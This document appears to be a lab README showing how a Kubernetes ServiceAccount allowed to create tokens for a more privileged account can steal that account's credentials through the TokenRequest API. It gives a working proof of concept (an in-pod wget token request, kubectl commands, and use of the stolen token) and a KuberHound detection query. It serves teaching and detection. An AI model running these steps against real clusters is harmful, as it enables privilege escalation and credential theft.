### Summary
A subject granted `create` on `serviceaccounts/token`, scoped to a specific ServiceAccount, can mint a brand-new valid token for that account via the TokenRequest API - no pod exec, no pod creation, no binding to that account's Role required. If the target SA is more privileged, this is instant identity theft.

### Details
The TokenRequest API (`POST /api/v1/namespaces/<ns>/serviceaccounts/<name>/token`) issues a fresh, signed JWT for the named ServiceAccount to whoever calls it. Authorization is a single RBAC check: `create` on the `serviceaccounts/token` subresource, optionally scoped by `resourceNames` to specific SA names. It's easy to grant narrowly by accident - e.g. "let this CI operator mint tokens for the deploy-bot SA" - without realizing that grant is equivalent to handing over deploy-bot's full credentials on demand.

In this attack path:
1. Role `victim-admin-role` grants `*`/`*`/`*` (full namespace admin) in `07-token-theft`, bound to ServiceAccount `privileged-sa`.
2. ServiceAccount `sa-token-thief` is bound to Role `token-minter`, which grants `get/list` on `serviceaccounts` and `create` on `serviceaccounts/token`, scoped via `resourceNames: [privileged-sa]`. `sa-token-thief` has no other permissions.
3. Pod `attacker-pod` runs as `sa-token-thief` with its own token mounted.
4. Using that token, the pod calls the TokenRequest API for `privileged-sa` and receives back a valid, signed token for it.
5. That stolen token carries all of `privileged-sa`'s privileges - full namespace admin - usable directly, no RoleBinding ever touched.

### PoC
Deploy:
```
$ kubectl apply -f 07-sa-token-create-theft.yaml
```

Confirm the starting state - no direct access, but able to mint a token for the target SA:
```
$ kubectl auth can-i create secrets --as=system:serviceaccount:07-token-theft:sa-token-thief -n 07-token-theft
no

$ kubectl auth can-i create serviceaccounts/privileged-sa --subresource=token --as=system:serviceaccount:07-token-theft:sa-token-thief -n 07-token-theft
yes
```

From inside `attacker-pod`, use its own mounted token to request a token for `privileged-sa`:
```
$ kubectl exec -n 07-token-theft attacker-pod -- sh -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
cat <<JSON > /tmp/tr.json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": { "expirationSeconds": 600 }
}
JSON
wget -q -O- \
  --header="Authorization: Bearer $TOKEN" \
  --header="Content-Type: application/json" \
  --post-file=/tmp/tr.json \
  --no-check-certificate \
  https://kubernetes.default.svc/api/v1/namespaces/07-token-theft/serviceaccounts/privileged-sa/token
'
```

Or with kubctl:

```
$ export TOKEN=$(kubectl create token -n 07-token-theft sa-token-thief )

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN  --kubeconfig <(echo) create token privileged-sa -n 07-token-theft
```

The response's `.status.token` is a fully valid credential for `privileged-sa`. Use it directly:
```
$ kubectl --token=<stolen-token> auth can-i '*' '*' -n 07-token-theft
yes

$ kubectl --token=<stolen-token> -n 07-token-theft create secret generic proof-of-theft --from-literal=owned=true
secret/proof-of-theft created
```

`sa-token-thief` never held `victim-admin-role`, was never bound to it, and never exec'd into any pod belonging to `privileged-sa` - it just asked the API for a token on its behalf.

### Impact
Any identity holding `create` on `serviceaccounts/token` for a given SA can impersonate that SA completely and indefinitely (tokens can be re-minted after expiry), without ever needing the target's RoleBindings, without pod-level access to anything running as that SA, and without leaving a RoleBinding-shaped audit trail like [06-README.md](06-README.md)'s bind-escalation does.

### KuberHound Detection
`create` on `serviceaccounts/token` creates a `CAN_CREATE_TOKEN` edge from the Role to each ServiceAccount it can mint tokens for (here only `privileged-sa`, because of `resourceNames`), so pathfinding follows `sa-token-thief → token-minter → privileged-sa → victim-admin-role`. Saved query `"KuberHound: Token minting and impersonation of other identities"`:

```cypher
MATCH p=(i)-[:BOUND_TO]->(r)-[:CAN_CREATE_TOKEN|CAN_PLANT_TOKEN_SECRET|CAN_IMPERSONATE]->(t) WHERE i <> t AND NOT '*:*:*' IN r.rules AND NOT toLower(r.name) STARTS WITH 'system:' AND NOT toLower(i.name) STARTS WITH 'system:' RETURN p
```

The Role also keeps the `TOKEN_CREATE` attack capability, used by `"KuberHound: ServiceAccounts with TOKEN_CREATE capability"`.

### Advisories
Not a CVE - documented Kubernetes behavior (TokenRequest API, stable since 1.20):
https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#bound-service-account-token-volume
